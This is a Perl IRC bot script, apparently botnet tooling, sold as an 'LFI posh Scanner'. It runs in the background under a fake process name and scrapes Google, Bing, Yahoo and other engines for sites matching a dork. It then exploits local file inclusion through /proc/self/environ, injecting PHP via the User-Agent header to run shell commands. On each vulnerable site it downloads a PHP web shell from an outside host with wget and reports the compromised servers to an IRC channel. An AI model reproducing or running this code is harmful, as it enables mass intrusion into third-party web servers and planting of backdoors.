#!/usr/bin/perl
use HTTP::Request;
use LWP::UserAgent;
use IO::Socket;
use IO::Select;
use Socket;

my $fakeproc  = $ARGV[6];
$ircserver    = $ARGV[0] unless $ircserver;
my $ircport   = $ARGV[1];
my $nickname  = $ARGV[2];
my $ident     = $ARGV[3];
my $channel   = '#'.$ARGV[4];
my $runner    = $ARGV[5];
my $fullname  = 'my live';

my $poshscan   = $ARGV[7];

$posh_test     = "../../../../../../../../../../../../../proc/self/environ%00";
$posh_shell    = "http://www.mycashsaver.net/uploads/1270165133.txt";

my $success   = "\n [+] posh Scanner\n [-] Loading Successfully ...\n [-] Process/PID : $fakeproc - $$\n";
my $failed    = "\n [-] perl $0 <host> <port> <botnick> <botident> <botchan> <yournick> <fakeproc> <command>\n\n";

if (@ARGV != 8) { print $failed; exit(); } else { print $success; }

$SIG{'INT'}   = 'IGNORE';
$SIG{'HUP'}   = 'IGNORE';
$SIG{'TERM'}  = 'IGNORE';
$SIG{'CHLD'}  = 'IGNORE';
$SIG{'PS'}    = 'IGNORE';

chdir("/");
$ircserver="$ARGV[0]" if $ARGV[0];
$0 = "$fakeproc"."\0"x16;;
my $pid = fork;
exit if $pid;
die "\n [!] Something Wrong !!!: $!" unless defined($pid);

our %irc_servers;
our %DCC;
my $dcc_sel = new IO::Select->new();
$sel_client = IO::Select->new();

sub sendraw {
    if ($#_ == '1') {
    my $socket = $_[0];
    print $socket "$_[1]\n";
    } else {
        print $IRC_cur_socket "$_[0]\n";
    }
}

sub connector {
    my $mynick = $_[0];
    my $ircserver_con = $_[1];
    my $ircport_con = $_[2];
    my $IRC_socket = IO::Socket::INET->new(Proto=>"tcp", PeerAddr=>"$ircserver_con", PeerPort=>$ircport_con) or return(1);
    if (defined($IRC_socket)) {
        $IRC_cur_socket = $IRC_socket;
        $IRC_socket->autoflush(1);
        $sel_client->add($IRC_socket);
        $irc_servers{$IRC_cur_socket}{'host'} = "$ircserver_con";
        $irc_servers{$IRC_cur_socket}{'port'} = "$ircport_con";
        $irc_servers{$IRC_cur_socket}{'nick'} = $mynick;
        $irc_servers{$IRC_cur_socket}{'myip'} = $IRC_socket->sockhost;
        nick("$mynick");
        sendraw("USER $ident ".$IRC_socket->sockhost." $ircserver_con :$fullname");
        sleep 1;
    }
}

sub parse {
    my $servarg = shift;
    if ($servarg =~ /^PING \:(.*)/) {
        sendraw("PONG :$1");
    } elsif ($servarg =~ /^\:(.+?)\!(.+?)\@(.+?) PRIVMSG (.+?) \:(.+)/) {
        my $pn=$1; my $hostmask= $3; my $onde = $4; my $args = $5;
        if ($args =~ /^\001VERSION\001$/) {
            notice("$pn", "\001VERSION mIRC v6.17 Khaled Mardam-Bey\001");
        }
        if ($args =~ /^(\Q$mynick\E|\!a)\s+(.*)/ ) {
            my $natrix = $1;
            my $arg = $2;
        }
    }
    elsif ($servarg =~ /^\:(.+?)\!(.+?)\@(.+?)\s+NICK\s+\:(\S+)/i) {
        if (lc($1) eq lc($mynick)) {
            $mynick=$4;
            $irc_servers{$IRC_cur_socket}{'nick'} = $mynick;
        }
    } elsif ($servarg =~ m/^\:(.+?)\s+433/i) {
        nick("$mynick|".int rand(999));
    } elsif ($servarg =~ m/^\:(.+?)\s+001\s+(\S+)\s/i) {
        $mynick = $2;
        $irc_servers{$IRC_cur_socket}{'nick'} = $mynick;
        $irc_servers{$IRC_cur_socket}{'nome'} = "$1";
        sendraw("MODE $nickname +Bx");
        sendraw("JOIN $channel");
        sendraw("PRIVMSG $channel :posh Scanner");
        sendraw("PRIVMSG $runner :$mulai...!!!");
    }
}

my $line_temp;
while( 1 ) {
    while (!(keys(%irc_servers))) { connector("$nickname", "$ircserver", "$ircport"); }
    delete($irc_servers{''}) if (defined($irc_servers{''}));
    my @ready = $sel_client->can_read(0);
    next unless(@ready);
    foreach $fh (@ready) {
        $IRC_cur_socket = $fh;
        $mynick = $irc_servers{$IRC_cur_socket}{'nick'};
        $nread = sysread($fh, $msg, 4096);
        if ($nread == 0) {
            $sel_client->remove($fh);
            $fh->close;
            delete($irc_servers{$fh});
        }
        @lines = split (/\n/, $msg);
        $msg =~ s/\r\n$//;

        #####################################################################
        ############################[ CMD LIST ]#############################
        #####################################################################

        if ($msg=~ /PRIVMSG $channel :!help/){
            sendraw($IRC_cur_socket, "PRIVMSG $channel :>>> $poshscan <lfibug> <dork> ");
            sendraw($IRC_cur_socket, "PRIVMSG $channel :>>> !engine | !pid  | !about ");
        }

        if ($msg=~ /PRIVMSG $channel :!xpl/){
            sendraw($IRC_cur_socket, "PRIVMSG $channel :>>> Exploit -> ????? ");
        }

        if ($msg=~ /PRIVMSG $channel :!version/){
            sendraw($IRC_cur_socket, "PRIVMSG $channel :>>> LFI posh Scanner v1");
        }

        if ($msg=~ /PRIVMSG $channel :!engine/){
            sendraw($IRC_cur_socket, "PRIVMSG $channel :>>> Engine -> Google, Bing, AllTheWeb, Altavista, ASK, UOL, Yahoo.");
        }

        if ($msg=~ /PRIVMSG $channel :!pid/){
            sendraw($IRC_cur_socket, "PRIVMSG $channel (PID Process/ID :  $fakeproc - $$");
        }

        if ($msg=~ /PRIVMSG $channel :!about/){
            sendraw($IRC_cur_socket, "PRIVMSG $channel :LFI posh Scanner v1");
        }

        ##################################################################### Google Engine
        if ($msg=~ /PRIVMSG $channel :$poshscan\s+(.*?)\s+(.*)/ ) {
            if (my $pid = fork) {
                waitpid($pid, 0);
            }
            else {
                if (fork) {    exit; } else {
                    my $engx = "GooGLe";
                    my $bugx = $1;
                    my $d0rk = $2;
                    sendraw($IRC_cur_socket, "PRIVMSG $channel :>>> Dork :$d0rk");
                    sendraw($IRC_cur_socket, "PRIVMSG $channel :>>> File :$bugx");
                    sendraw($IRC_cur_socket, "PRIVMSG $channel :>>> Mulai Mencari .......");
                    &lfiscan($engx,$bugx,$d0rk);
                }
                exit;
            }
        }

        ##################################################################### AllTheWeb Engine
        if ($msg=~ /PRIVMSG $channel :$poshscan\s+(.*?)\s+(.*)/ ) {
            if (my $pid = fork) {
                waitpid($pid, 0);
            }
            else {
                if (fork) {    exit; } else {
                    my $engx = "AllTheWeb";
                    my $bugx = $1;
                    my $d0rk = $2;
                    &lfiscan($engx,$bugx,$d0rk);
                }
                exit;
            }
        }

        ##################################################################### Bing Engine
        if ($msg=~ /PRIVMSG $channel :$poshscan\s+(.*?)\s+(.*)/ ) {
            if (my $pid = fork) {
                waitpid($pid, 0);
            }
            else {
                if (fork) {    exit; } else {
                    my $engx = "Bing";
                    my $bugx = $1;
                    my $d0rk = $2;
                    &lfiscan($engx,$bugx,$d0rk);
                }
                exit;
            }
        }

        ##################################################################### Altavista Engine
        if ($msg=~ /PRIVMSG $channel :$poshscan\s+(.*?)\s+(.*)/ ) {
            if (my $pid = fork) {
                waitpid($pid, 0);
            }
            else {
                if (fork) {    exit; } else {
                    my $engx = "ALtaViSTa";
                    my $bugx = $1;
                    my $d0rk = $2;
                    &lfiscan($engx,$bugx,$d0rk);
                }
                exit;
            }
        }

        ##################################################################### ASK Engine
        if ($msg=~ /PRIVMSG $channel :$poshscan\s+(.*?)\s+(.*)/ ) {
            if (my $pid = fork) {
                waitpid($pid, 0);
            }
            else {
                if (fork) {    exit; } else {
                    my $engx = "AsK";
                    my $bugx = $1;
                    my $d0rk = $2;
                    &lfiscan($engx,$bugx,$d0rk);
                }
                exit;
            }
        }

        ##################################################################### UoL Engine
        if ($msg=~ /PRIVMSG $channel :$poshscan\s+(.*?)\s+(.*)/ ) {
            if (my $pid = fork) {
                waitpid($pid, 0);
            }
            else {
                if (fork) {    exit; } else {
                    my $engx = "UoL";
                    my $bugx = $1;
                    my $d0rk = $2;
                    &lfiscan($engx,$bugx,$d0rk);
                }
                exit;
            }
        }

        ##################################################################### Yahoo Engine
        if ($msg=~ /PRIVMSG $channel :$poshscan\s+(.*?)\s+(.*)/ ) {
            if (my $pid = fork) {
                waitpid($pid, 0);
            }
            else {
                if (fork) {    exit; } else {
                    my $engx = "YahOo";
                    my $bugx = $1;
                    my $d0rk = $2;
                    &lfiscan($engx,$bugx,$d0rk);
                }
                exit;
            }
        }

        for(my $c=0; $c<= $#lines; $c++) {
            $line = $lines[$c];
            $line=$line_temp.$line if ($line_temp);
            $line_temp='';
            $line =~ s/\r$//;
            unless ($c == $#lines) {
                parse("$line");
            } else {
                if ($#lines == 0) {
                    parse("$line");
                } elsif ($lines[$c] =~ /\r$/) {
                    parse("$line");
                } elsif ($line =~ /^(\S+) NOTICE AUTH :\*\*\*/) {
                    parse("$line");
                } else {
                    $line_temp = $line;
                }
            }
        }
    }
}

##################################################################### Procedure

sub lfiscan() {
    my $engz = $_[0];
    my $bugz = $_[1];
    my $dork = $_[2];
    my $contatore = 0;    
    if ($engz =~ /GooGLe/) {
        my @google=&google($dork);
        push(@total, @google);
        }
    if ($engz =~ /AllTheWeb/) {
        my @alltheweb=&alltheweb($dork);
        push(@total, @alltheweb);
    }
    if ($engz =~ /Bing/) {
        my @Bing=&Bing($dork);
        push(@total, @Bing);
    }
    if ($engz =~ /ALtaViSTa/) {
        my @altavista=&altavista($dork);
        push(@total, @altavista);
    }
    if ($engz =~ /AsK/) {
        my @ask=&ask($dork);
        push(@total, @ask);
    }
    if ($engz =~ /UoL/) {
        my @uol=&uol($dork);
        push(@total, @uol);
    }
    if ($engz =~ /YahOo/) {
        my @yahoo=&yahoo($dork);
        push(@total, @yahoo);
    }
    my @clean = &calculate(@total);
    sendraw($IRC_cur_socket, "PRIVMSG $channel :>>> (@$engz) Total: (".scalar(@total).") Clean: (".scalar(@clean).")");
    if (scalar(@clean) != 0) {
        sendraw($IRC_cur_socket, "PRIVMSG $channel :>>> Exploiting (@$engz) $dork");
    }
    my $uni=scalar(@clean);
    foreach my $target (@clean)
    {
             $contatore++;
        if ($contatore==$uni-1){
            sendraw($IRC_cur_socket, "PRIVMSG $channel :>> (@POSH)(@$engz) Scan selesai dengan $dork");
        }
        my $lfi  = "../../../../../../../../../../../../..";
        my $xpl  = "http://".$target.$bugz.$posh_test;
        my $vuln = "http://".$target."12".$bugz."7".$posh_test."";
        my $re   = getcontent($xpl);
        if ($re  =~ /DOCUMENT_ROOT=\// && $re =~ /HTTP_USER_AGENT/){
            if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else {
                my $ijo = exploit($xpl,"uname -svnrp;echo c0li;id");
                $ijo =~ s/\n//g;
                if ($ijo =~ /c0li#(.*)c0liuid=(.*)#c0li/sg) {
                    my ($sys,$uid) = ($1,$2);
                    sendraw($IRC_cur_socket, "PRIVMSG $channel :>> ($engz)(@System) http://".$target."12".$bugz."6[LFI] 15(7@3".$sys." 7uid=".$uid."15)");
                    my $tmp = "/tmp/file".int rand(100);
                    my $upload = exploit($xpl,"wget $posh_shell -O $tmp"); sleep(1);
                    my $res = getcontent("http://".$target.$bugz.$lfi.$tmp.'%00');
                    if ($res =~ /- G-posh -/) {
                        sendraw($IRC_cur_socket, "PRIVMSG $runner :>> (@$engz)(@PHPSheLL) http://".$target."12".$bugz."6".$lfi."7".$tmp."%00 15(7@3".$sys."15)");
						sendraw($IRC_cur_socket, "PRIVMSG $channel :>> (@$engz)(@PHPSheLL) http://".$target."12".$bugz."6".$lfi."7".$tmp."%00 15(7@3".$sys."15)");
                    }
                }
                else {
                    sendraw($IRC_cur_socket, "PRIVMSG $channel :>> (@$engz5)(@Vuln) ".$vuln." ");
                }
            } exit } sleep(3);
        }
    }
}

sub getcontent() {
    my $url = $_[0];
    my $req = HTTP::Request->new(GET => $url);
    my $ua  = LWP::UserAgent->new();
    $ua->timeout(10);
    my $response = $ua->request($req);
    return $response->content;
}

sub exploit() {
    my $url = $_[0];
    my $rce = $_[1];
    my $agent = "<?php echo \"c0li#\"; passthru(\'".$rce."\'); echo \"#c0li\"; ?>";
    my $ua = LWP::UserAgent->new(agent => $agent);
    $ua->timeout(10);
    my $req = HTTP::Request->new(GET => $url);
    my $response = $ua->request($req);
    return $response->content;
}

sub google(){
    my @lst;
    my $key = $_[0];
    my $b   = 0;
    for ($b=0; $b<=1000; $b+=100){
        my $Go=("http://www.google.com/search?q=".key($key)."&num=100&filter=0&start=".$b);
        my $Res=query($Go);
        while ($Res =~ m/<a href=\"?http:\/\/([^>\"]*)\//g){
            if ($1 !~ /google/){
                my $k=$1;
                my @grep=links($k);
                push(@lst,@grep);
            }
        }
    }
return @lst;
}

sub alltheweb() {
    my @lst;
    my $key = $_[0];
    my $b   = 0;
    my $pg  = 0;
    for ($b=0; $b<=1000; $b+=100) {
        my $all = ("http://www.alltheweb.com/search?cat=web&_sb_lang=any&hits=100&q=".key($key)."&o=".$b);
        my $Res = query($all);
        while ( $Res =~ m/<span class=\"?resURL\"?>http:\/\/(.+?)\<\/span>/g ) {
            my $k = $1;
            $k =~ s/ //g;
            my @grep = links($k);
            push( @lst, @grep );
        }
    }
    return @lst;
}

sub uol() {
    my @lst;
    my $key = $_[0];
    my $b   = 0;
    for ($b=1; $b<=1000; $b+=10) {
        my $UoL = ("http://mundo.busca.uol.com.br/buscar.html?q=".key($key)."&start=".$b);
        my $Res = query($UoL);
        while ( $Res =~ m/<a href=\"http:\/\/([^>\"]*)/g ) {
            my $k = $1;
            if ( $k !~ /busca|uol|yahoo/ ) {
                my $k    = $1;
                my @grep = links($k);
                push( @lst, @grep );
            }
        }
    }
    return @lst;
}

sub Bing() {
    my @lst;
    my $key = $_[0];
    my $b   = 0;
    for ($b=1; $b<=1000; $b+=10) {
        my $bing = ("http://www.bing.com/search?q=".key($key)."&filt=all&first=".$b."&FORM=PERE");
        my $Res = query($bing);
        while ( $Res =~ m/<a href=\"?http:\/\/([^>\"]*)\//g ) {
            if ( $1 !~ /msn|live|bing/ ) {
                my $k    = $1;
                my @grep = links($k);
                push( @lst, @grep );
            }
        }
    }
    return @lst;
}

sub altavista(){
    my @lst;
    my $key = $_[0];
    my $b   = 0;
    for ($b=1; $b<=1000; $b+=10){
        my $AlT=("http://it.altavista.com/web/results?itag=ody&kgs=0&kls=0&dis=1&q=".key($key)."&stq=".$b);
        my $Res=query($AlT);
        while ($Res=~m/<span class=ngrn>(.+?)\//g){
            if ($1 !~ /altavista/){
                my $k=$1;
                $k=~s/<//g;
                $k=~s/ //g;
                my @grep=links($k);
                push(@lst,@grep);
            }
        }
    }
return @lst;
}

sub ask() {
    my @lst;
    my $key = $_[0];
    my $b   = 0;
    my $pg  = 0;
    for ($b=0; $b<=1000; $b+=10) {
        my $Ask = ("http://it.ask.com/web?q=".key($key)."&o=0&l=dir&qsrc=0&qid=EE90DE6E8F5370F363A63EC61228D4FE&dm=all&page=".$b);
        my $Res = query($Ask);
        while ($Res =~ m/href=\"http:\/\/(.+?)\" onmousedown=/g) {
            if ($1 !~ /ask.com/){
                my $k = $1;
                my @grep = links($k);
                push( @lst, @grep );
            }
        }
    }
    return @lst;
}

sub yahoo() {
    my @lst;
    my $key = $_[0];
    my $b   = 0;
    for ($b=1; $b<=500; $b+=1) {
        my $yahoo = ("http://www.search.yahoo.com/search?p=".key($key)."&ei=UTF-8&fr=yfp-t-501&fp_ip=IT&pstart=1&b=".$b);
        my $Res = query($yahoo);
        while ($Res =~ m/26u=(.*?)%26w=/g) {
            if ($1 !~ /yahoo/){
                my $k = $1;
                my @grep = links($k);
                push(@lst, @grep);
            }
        }
    }
    return @lst;
}

sub links() {
    my @l;
    my $link = $_[0];
    my $host = $_[0];
    my $hdir = $_[0];
    $hdir =~ s/(.*)\/[^\/]*$/\1/;
    $host =~ s/([-a-zA-Z0-9\.]+)\/.*/$1/;
    $host .= "/";
    $link .= "/";
    $hdir .= "/";
    $host =~ s/\/\//\//g;
    $hdir =~ s/\/\//\//g;
    $link =~ s/\/\//\//g;
    push( @l, $link, $host, $hdir );
    return @l;
}

sub key() {
    my $dork = $_[0];
    $dork =~ s/ /\+/g;
    $dork =~ s/:/\%3A/g;
    $dork =~ s/\//\%2F/g;
    $dork =~ s/&/\%26/g;
    $dork =~ s/\"/\%22/g;
    $dork =~ s/,/\%2C/g;
    $dork =~ s/\\/\%5C/g;
    return $dork;
}

sub query($) {
    my $url = $_[0];
    $url =~ s/http:\/\///;
    my $host  = $url;
    my $query = $url;
    my $page  = "";
    $host  =~ s/href=\"?http:\/\///;
    $host  =~ s/([-a-zA-Z0-9\.]+)\/.*/$1/;
    $query =~ s/$host//;
    if ( $query eq "" ) { $query = "/"; }
        eval {
            my $sock = IO::Socket::INET->new(PeerAddr => "$host", PeerPort => "80", Proto => "tcp") or return;
            print $sock "GET $query HTTP/1.0\r\nHost: $host\r\nAccept: */*\r\nUser-Agent: Mozilla/5.0\r\n\r\n";
            my @r = <$sock>;
            $page = "@r";
            close($sock);
        };
    return $page;
}

sub calculate {
    my @calculate = ();
    my %visti = ();
    foreach my $element (@_) {
        $element =~ s/\/+/\//g;
        next if $visti{$element}++;
        push @calculate, $element;
    }
    return @calculate;
}

sub nick {
    return unless $#_ == 0;
    sendraw("NICK $_[0]");
}

sub notice {
    return unless $#_ == 1;
    sendraw("NOTICE $_[0] :$_[1]");
}
